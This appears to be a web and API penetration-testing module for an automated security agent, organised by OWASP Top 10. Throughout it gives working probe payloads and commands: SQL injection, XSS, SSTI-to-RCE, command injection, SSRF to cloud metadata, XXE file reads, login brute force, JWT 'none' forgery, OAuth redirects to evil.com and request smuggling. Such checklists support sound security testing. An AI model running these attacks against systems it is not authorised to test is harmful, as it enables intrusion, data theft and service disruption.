# CodexSec — Web/API Security Module

This module activates when the target is a web application or API. It supplements the base methodology with web-specific attack vectors.

## OWASP Top 10 (2021) Checklist

Test for each of these in order of typical impact:

### A01: Broken Access Control
The #1 web vulnerability. Test EVERY endpoint that returns user-specific data.

**IDOR (Insecure Direct Object References):**
```bash
# Get your own resource, note the ID format
curl -s -H "Authorization: Bearer TOKEN_A" "https://TARGET/api/users/me" | jq '.id'

# Access another user's resource with your token
curl -s -H "Authorization: Bearer TOKEN_A" "https://TARGET/api/users/OTHER_USER_ID"

# Test on ALL resource endpoints: /orders/{id}, /documents/{id}, /messages/{id}, etc.
# Test both GET (read) and PUT/PATCH/DELETE (modify/delete)
```

**Privilege Escalation:**
```bash
# Access admin endpoints with regular user token
curl -s -H "Authorization: Bearer REGULAR_USER_TOKEN" "https://TARGET/api/admin/users"
curl -s -H "Authorization: Bearer REGULAR_USER_TOKEN" "https://TARGET/api/admin/settings"

# Modify your own role
curl -s -X PATCH -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" \
  "https://TARGET/api/users/me" -d '{"role": "admin"}'

# Mass assignment — send extra fields the API might accept
curl -s -X POST -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" \
  "https://TARGET/api/users" -d '{"name":"test","email":"t@t.com","role":"admin","is_admin":true}'
```

**Forced Browsing:**
```bash
# Discover unlinked admin/debug paths
ffuf -u "https://TARGET/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -mc 200,301,302,403 -fc 404

# API version enumeration
for v in v1 v2 v3 internal admin debug; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://TARGET/api/$v/")
  [ "$code" != "404" ] && echo "/api/$v/ -> $code"
done
```

### A02: Cryptographic Failures
```bash
# Check TLS configuration
nmap --script ssl-enum-ciphers -p 443 TARGET_HOST

# Check for sensitive data in URLs (tokens, passwords in query params)
# Check if cookies have Secure, HttpOnly, SameSite flags
curl -sI "https://TARGET/login" | grep -i "set-cookie"

# Check for sensitive data in response bodies that shouldn't be there
# (password hashes, internal IDs, API keys, other users' PII)
```

### A03: Injection

**SQL Injection:**
```bash
# Error-based detection
curl -s "https://TARGET/api/search?q=test'" 
curl -s "https://TARGET/api/search?q=test\"" 
curl -s "https://TARGET/api/search?q=test;--"

# Boolean-based blind
curl -s "https://TARGET/api/items?id=1 AND 1=1"
curl -s "https://TARGET/api/items?id=1 AND 1=2"
# Compare response lengths — if different, likely injectable

# Time-based blind
curl -s -w "\nTime: %{time_total}\n" "https://TARGET/api/items?id=1; SELECT SLEEP(5)--"
curl -s -w "\nTime: %{time_total}\n" "https://TARGET/api/items?id=1; SELECT pg_sleep(5)--"

# Automate with sqlmap once injection point confirmed
sqlmap -u "https://TARGET/api/items?id=1" --batch --level=3 --risk=2 --threads=4 \
  --headers="Authorization: Bearer TOKEN" --technique=BEUST
```

**Cross-Site Scripting (XSS):**
```bash
# Reflected XSS — test every parameter that reflects in response
# Start with canary to find reflection points
curl -s "https://TARGET/search?q=xss_canary_7742" | grep "xss_canary_7742"

# If reflected, test context-appropriate payloads:
# HTML context:
curl -s "https://TARGET/search?q=<script>alert(1)</script>"
curl -s "https://TARGET/search?q=<img src=x onerror=alert(1)>"
curl -s "https://TARGET/search?q=<svg/onload=alert(1)>"

# Attribute context:
curl -s "https://TARGET/search?q=\"onmouseover=\"alert(1)\""
curl -s "https://TARGET/search?q=' autofocus onfocus='alert(1)"

# JavaScript context:
curl -s "https://TARGET/search?q=';alert(1)//"
curl -s "https://TARGET/search?q=\";alert(1)//"

# Use dalfox for automated XSS scanning
dalfox url "https://TARGET/search?q=test" --skip-bav -o xss_results.json
```

**Server-Side Template Injection (SSTI):**
```bash
# Test common template engine payloads
curl -s "https://TARGET/render?name={{7*7}}"          # Jinja2/Twig -> 49
curl -s "https://TARGET/render?name=${7*7}"           # FreeMarker/EL -> 49
curl -s "https://TARGET/render?name=<%= 7*7 %>"      # ERB -> 49
curl -s "https://TARGET/render?name={{constructor.constructor('return 1')()}}" # Pug/Jade

# If math resolves, escalate to RCE:
# Jinja2:
curl -s "https://TARGET/render?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
```

**Command Injection:**
```bash
# Test parameters that might hit system commands (filenames, hostnames, IPs)
curl -s "https://TARGET/api/ping?host=127.0.0.1;id"
curl -s "https://TARGET/api/ping?host=127.0.0.1|id"
curl -s "https://TARGET/api/ping?host=\$(id)"
curl -s "https://TARGET/api/ping?host=127.0.0.1%0aid"   # newline injection

# Blind command injection — use time-based
curl -s -w "\nTime: %{time_total}\n" "https://TARGET/api/ping?host=127.0.0.1;sleep+5"
```

**Server-Side Request Forgery (SSRF):**
```bash
# Test parameters that accept URLs (webhooks, callbacks, image URLs, imports)
curl -s -X POST "https://TARGET/api/webhook" -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:80"}'

# Cloud metadata endpoints
curl -s -X POST "https://TARGET/api/fetch-url" -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'
curl -s -X POST "https://TARGET/api/fetch-url" -H "Content-Type: application/json" \
  -d '{"url": "http://metadata.google.internal/computeMetadata/v1/"}'

# Bypass filters
# Decimal IP: http://2130706433 (127.0.0.1)
# IPv6: http://[::1]
# Redirect: set up redirect from allowed domain to internal IP
# DNS rebinding: use a service like rebind.it
```

### A04: Insecure Design

**Business Logic Flaws:**
```bash
# Price manipulation — modify price/amount in requests
curl -s -X POST "https://TARGET/api/orders" -H "Content-Type: application/json" \
  -d '{"item_id": 1, "price": 0.01, "quantity": 1}'
curl -s -X POST "https://TARGET/api/orders" -H "Content-Type: application/json" \
  -d '{"item_id": 1, "price": -100, "quantity": 1}'

# Workflow bypass — skip steps in multi-step process
# e.g., go directly to payment confirmation without adding items
# e.g., access step 3 URL without completing step 1 and 2

# Race conditions
# Send parallel requests to abuse TOCTOU
python3 -c "
import threading, requests
url = 'https://TARGET/api/redeem-coupon'
headers = {'Authorization': 'Bearer TOKEN', 'Content-Type': 'application/json'}
data = '{\"code\": \"DISCOUNT50\"}'
def send(): requests.post(url, headers=headers, data=data)
threads = [threading.Thread(target=send) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
"

# Rate limiting on sensitive endpoints
# Brute-force login with no rate limit
ffuf -u "https://TARGET/api/login" -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@target.com","password":"FUZZ"}' \
  -w /usr/share/seclists/Passwords/Common-Credentials/top-1000.txt \
  -mc all -fc 401
```

### A05: Security Misconfiguration
```bash
# Security headers audit
curl -sI "https://TARGET/" | grep -iE "(strict-transport|content-security|x-frame|x-content-type|referrer-policy|permissions-policy)"

# CORS misconfiguration
curl -sI -H "Origin: https://evil.com" "https://TARGET/api/data" | grep -i "access-control"
# Check if arbitrary origins are reflected
curl -sI -H "Origin: null" "https://TARGET/api/data" | grep -i "access-control"

# Debug/dev endpoints
for path in debug info health status metrics env config swagger api-docs graphql graphiql playground; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://TARGET/$path")
  [ "$code" != "404" ] && echo "/$path -> $code"
done

# HTTP methods
curl -s -X OPTIONS -I "https://TARGET/api/resource" | grep "Allow:"
curl -s -X TRACE "https://TARGET/" -I
curl -s -X PUT "https://TARGET/test.txt" -d "test"
```

### A06-A10: Additional Checks
```bash
# A06: Vulnerable components — check versions
# Look for version strings in headers, error pages, /package.json, etc.
curl -s "https://TARGET/package.json"
curl -s "https://TARGET/composer.json"

# A07: Auth failures — test login for username enumeration
# Different response for valid vs invalid username
curl -s -X POST "https://TARGET/api/login" -d '{"email":"real@user.com","password":"wrong"}'
curl -s -X POST "https://TARGET/api/login" -d '{"email":"fake@notreal.com","password":"wrong"}'
# Compare response body, status code, and timing

# A08: Data integrity — check for deserialization, CSRF
# Test CSRF: can state-changing requests succeed without CSRF token?
curl -s -X POST "https://TARGET/api/change-email" \
  -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com"}'
# If no CSRF token required on cookie-auth endpoints, it's CSRF-vulnerable

# A09: Logging gaps — trigger errors and check if you get blocked
# (Informational finding if no rate limiting after repeated auth failures)

# A10: SSRF — covered above in A03
```

## REST API Specific Testing

### Parameter Pollution
```bash
# HTTP Parameter Pollution — send same param twice
curl -s "https://TARGET/api/transfer?from=me&to=victim&to=attacker"
curl -s -X POST "https://TARGET/api/action" -H "Content-Type: application/json" \
  -d '{"role":"user","role":"admin"}'

# Parameter type juggling
curl -s "https://TARGET/api/users?id=1"          # number
curl -s "https://TARGET/api/users?id[]=1"         # array
curl -s "https://TARGET/api/users?id=true"        # boolean
curl -s "https://TARGET/api/users?id={\"$gt\":0}" # NoSQL operator
```

### Content-Type Abuse
```bash
# Switch content types to bypass input validation
curl -s -X POST "https://TARGET/api/data" -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# JSON to XML to bypass WAF
# URL-encoded to JSON
```

## GraphQL Specific Testing

```bash
# Introspection query — reveals entire schema
curl -s -X POST "https://TARGET/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name,args{name,type{name}}}}}}"}'

# If introspection is disabled, try field suggestion abuse
curl -s -X POST "https://TARGET/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{user{aaaa}}"}'
# Error may suggest valid fields: "Did you mean 'name', 'email'?"

# Batching attacks (bypass rate limiting)
curl -s -X POST "https://TARGET/graphql" -H "Content-Type: application/json" \
  -d '[{"query":"mutation{login(email:\"admin@t.com\",password:\"pass1\")}"},{"query":"mutation{login(email:\"admin@t.com\",password:\"pass2\")}"}]'

# Nested query DoS
curl -s -X POST "https://TARGET/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{users{posts{comments{author{posts{comments{author{name}}}}}}}}"}'

# Authorization bypass — access fields your role shouldn't see
curl -s -X POST "https://TARGET/graphql" -H "Content-Type: application/json" \
  -H "Authorization: Bearer REGULAR_TOKEN" \
  -d '{"query":"{users{id,email,password_hash,role,api_key}}"}'
```

## JWT Testing

```bash
# Decode JWT without verification
python3 -c "
import base64, json, sys
token = 'YOUR_JWT'
parts = token.split('.')
for i, part in enumerate(parts[:2]):
    padded = part + '=' * (4 - len(part) % 4)
    print(f'Part {i}:', json.dumps(json.loads(base64.urlsafe_b64decode(padded)), indent=2))
"

# Test 'none' algorithm bypass
python3 -c "
import base64, json
token = 'YOUR_JWT'
header = json.loads(base64.urlsafe_b64decode(token.split('.')[0] + '=='))
payload = json.loads(base64.urlsafe_b64decode(token.split('.')[1] + '=='))
header['alg'] = 'none'
h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
print(f'{h}.{p}.')
"

# Test key confusion (RS256 -> HS256)
# If server uses RS256 but accepts HS256, sign with the public key as HMAC secret

# Test expired token acceptance
# Modify 'exp' claim to a past date and see if server still accepts

# Test 'kid' injection
# kid: "../../dev/null" or SQL injection in kid parameter

# Test 'jku'/'x5u' header injection — point to attacker-controlled JWKS
```

## OAuth/SSO Testing

```bash
# Open redirect in redirect_uri
curl -sI "https://TARGET/oauth/authorize?client_id=X&redirect_uri=https://evil.com/callback&response_type=code"

# redirect_uri bypass techniques:
# https://TARGET.evil.com
# https://evil.com/TARGET
# https://TARGET/callback/../../../evil.com
# https://TARGET/callback?next=https://evil.com
# https://TARGET/callback#@evil.com

# CSRF on OAuth flow — is 'state' parameter required/validated?
# Test without state parameter
curl -sI "https://TARGET/oauth/authorize?client_id=X&redirect_uri=https://TARGET/callback&response_type=code"

# Token leakage via referer — does the callback page make external requests?
```

## HTTP Request Smuggling

```bash
# CL.TE detection
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | nc TARGET 443

# TE.CL detection  
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\nQ\r\n\r\n' | nc TARGET 443

# Check for request smuggling with timing differences
# Nuclei has templates for this: nuclei -u TARGET -t http/vulnerabilities/request-smuggling/
```
